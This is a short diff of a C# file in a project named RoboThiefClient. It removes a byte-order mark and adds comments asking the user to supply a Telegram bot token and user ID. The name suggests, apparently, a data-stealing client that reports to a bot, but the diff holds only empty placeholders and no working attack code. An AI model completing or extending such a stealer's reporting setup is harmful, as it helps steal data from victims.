@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -13,7 +13,10 @@ namespace RoboThiefClient
 
         public static void SetValues()
         {
+	    // Put your Bot token received from BotFather...
             BotToken = "";
+	    
+	    // Put your Userid here
             id = "";
         }
     }
